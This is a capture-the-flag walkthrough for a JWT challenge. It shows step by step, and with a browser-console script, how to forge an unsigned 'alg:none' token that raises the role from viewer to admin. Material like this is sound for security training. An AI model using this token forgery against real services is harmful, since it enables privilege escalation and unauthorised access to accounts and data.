 CHALLENGE 5 — access denied (JWT)  [150 pts]
════════════════════════════════════════
CLUE:
  POST /api/c5/token  → get a JWT cookie
  POST /api/c5/verify → submit the token

STEPS:
  1. Click "get token" → the server sets cookie "ctf_auth" with a JWT.
  2. Open DevTools → Application → Cookies → copy the "ctf_auth" value.
  3. The JWT has 3 parts: header.payload.signature (base64url encoded).
  4. Decode the header (first part):
       {"alg":"HS256","typ":"JWT"}
  5. The vulnerability: the server accepts alg:"none" → no signature needed!
  6. Modify the JWT:
     a. New header (base64url): {"alg":"none","typ":"JWT"}
        → base64url encode → "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
     b. Take the original payload, decode it, change "role":"viewer" to "role":"admin",
        re-encode to base64url.
     c. Combine: <new_header>.<new_payload>.   (empty signature, keep trailing dot)
  7. Set the cookie "ctf_auth" to this new value in DevTools.
  8. Click "verify" → server accepts it.

SHORTCUT using browser console:
  // Step 1: get token first (click the button), then:
  const parts = document.cookie.match(/ctf_auth=([^;]+)/)[1].split('.');
  const payload = JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')));
  payload.role = 'admin';
  const newPayload = btoa(JSON.stringify(payload)).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
  const newHeader = btoa(JSON.stringify({alg:'none',typ:'JWT'})).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
  document.cookie = 'ctf_auth=' + newHeader + '.' + newPayload + '.';
  // Then click verify
